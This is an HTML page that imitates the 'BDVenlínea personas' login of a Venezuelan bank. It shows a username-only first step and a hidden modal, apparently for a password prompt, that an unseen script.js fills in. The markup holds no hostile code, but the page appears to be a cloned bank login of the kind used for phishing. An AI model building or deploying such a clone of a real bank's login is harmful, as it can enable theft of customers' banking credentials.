<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BDVenlínea personas</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

    <div class="main-wrapper">
        <img src="background.webp" class="bg-img">

        <div class="content-area">
            <div class="login-card">
                <img src="logo.png" class="logo-bdv">
                
                <form id="step1">
                    <div class="input-box">
                        <input type="text" id="userField" placeholder="Usuario" autocomplete="off" required>
                    </div>
                    <button type="submit" class="btn-entrar">Entrar</button>
                </form>

                <div class="card-footer">
                    <a href="#" class="footer-link">¿Olvidaste tu usuario o clave?</a>
                    <p class="footer-text">Si eres nuevo clienteBDV <a href="#" class="bold-purple">regístrate aquí</a></p>
                </div>
            </div>
        </div>
    </div>

    <div class="modal-overlay" id="modalPass" style="display: none;">
        <div class="modal-box" id="modalContent"></div>
    </div>

    <script src="script.js"></script>
</body>
</html>
